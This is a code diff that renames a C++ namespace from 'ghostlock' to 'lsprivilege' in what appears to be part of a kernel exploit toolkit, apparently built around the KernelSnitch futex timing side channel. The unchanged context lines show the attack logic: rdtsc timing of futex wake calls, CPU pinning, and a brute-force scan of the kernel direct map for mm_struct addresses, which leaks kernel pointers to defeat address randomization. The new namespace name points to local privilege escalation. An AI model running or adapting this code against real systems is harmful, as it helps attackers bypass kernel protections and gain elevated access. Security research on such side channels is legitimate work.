@@ -23,9 +23,9 @@
 
 /* Measured direct-map end (never wider than the built-in bound). Owned by the
  * address-space layer; KernelSnitch only reads it to bound its scan. */
-namespace ghostlock::kernel {
+namespace lsprivilege::kernel {
     extern uint64_t g_direct_map_end;
-} // namespace ghostlock::kernel
+} // namespace lsprivilege::kernel
 
 #define FUTEX_SZ (64ULL<<30)
 #define FUTEX_MMAP_SZ (1ULL<<30)
@@ -41,8 +41,8 @@ namespace ghostlock::kernel {
 #elif defined(__ARM)
 #define VA_BITS 39
 #if VA_BITS==39
-#define IDENTITY_START (::ghostlock::kernel::KERNELSNITCH_IDENTITY_START)
-#define IDENTITY_END   (::ghostlock::kernel::KERNELSNITCH_IDENTITY_END)
+#define IDENTITY_START (::lsprivilege::kernel::KERNELSNITCH_IDENTITY_START)
+#define IDENTITY_END   (::lsprivilege::kernel::KERNELSNITCH_IDENTITY_END)
 // #define IDENTITY_END   0xffffffc000000000ULL
 #elif VA_BITS==48
 #define IDENTITY_START 0xffff000000000000ULL
@@ -53,7 +53,7 @@ namespace ghostlock::kernel {
 #define COARSE_SZ (1ULL << 30)
 #endif
 
-namespace ghostlock::kernelsnitch {
+namespace lsprivilege::kernelsnitch {
     enum kernelsnitch_state {
         KERNELSNITCH_NOT_INIT = 0,
         KERNELSNITCH_INIT,
@@ -190,9 +190,9 @@ namespace ghostlock::kernelsnitch {
         size_t __times[16];
         for (size_t l = 0; l < repeat; ++l) {
             sched_yield();
-            t0 = ghostlock::kernel::rdtsc_begin();
+            t0 = lsprivilege::kernel::rdtsc_begin();
             SYSCHK(__futex((uint32_t *) futex_addr, FUTEX_WAKE_PRIVATE, 0, nullptr, nullptr, 0));
-            t1 = ghostlock::kernel::rdtsc_end();
+            t1 = lsprivilege::kernel::rdtsc_end();
             __times[l] = t1 - t0;
         }
         qsort(__times, repeat, sizeof(size_t), __compare);
@@ -253,9 +253,9 @@ namespace ghostlock::kernelsnitch {
                 if (ks->verbose)
                     pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
                             coarse_addr + (1ULL << 40));
-            size_t slab_end = ghostlock::kernelsnitch::scan_limit(coarse_addr, COARSE_SZ, range->end);
+            size_t slab_end = lsprivilege::kernelsnitch::scan_limit(coarse_addr, COARSE_SZ, range->end);
             for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
-                size_t slab_limit = ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
+                size_t slab_limit = lsprivilege::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
                 for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
                      mm_struct_candidate += ks->mm_struct_sz) {
                     if (mm_leak_arg->try_canonical) {
@@ -287,7 +287,7 @@ namespace ghostlock::kernelsnitch {
     static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
-        const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+        const size_t ceiling = std::min<uint64_t>(lsprivilege::kernel::g_direct_map_end,
                                                   static_cast<uint64_t>(IDENTITY_END));
         for (size_t i = 0; i < ks->thread_cnt; ++i) {
             struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
@@ -364,7 +364,7 @@ namespace ghostlock::kernelsnitch {
         /* mm_structs live in the direct map, so the scan stops at its end and never
      * past the identity range the futexes are drawn from */
         ks->identity_diff =
-                ((std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                ((std::min<uint64_t>(lsprivilege::kernel::g_direct_map_end,
                                      static_cast<uint64_t>(IDENTITY_END)) -
                   static_cast<uint64_t>(IDENTITY_START)) / ks->thread_cnt);
 
@@ -382,7 +382,7 @@ namespace ghostlock::kernelsnitch {
                 ks->mm_slab_order,
                 ks->thread_cnt,
                 ks->collisions);
-        ghostlock::kernel::pin_to_core(__pin_cpu);
+        lsprivilege::kernel::pin_to_core(__pin_cpu);
 
         ks->state = KERNELSNITCH_INIT;
         return ks;
@@ -632,7 +632,7 @@ namespace ghostlock::kernelsnitch {
     int32_t context_scan(KernelSnitchContext *ks) {
         ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
         if (ks->verbose) pr_info("start bruteforcing\n");
-        ghostlock::kernel::reset_cpu_pin();
+        lsprivilege::kernel::reset_cpu_pin();
 
         __run_mm_leak_pass(ks, 1, 0);
         if (!ks->found)
@@ -763,4 +763,4 @@ namespace ghostlock::kernelsnitch {
 
         KernelSnitchContext *context_ = nullptr;
     };
-} // namespace ghostlock::kernelsnitch
+} // namespace lsprivilege::kernelsnitch
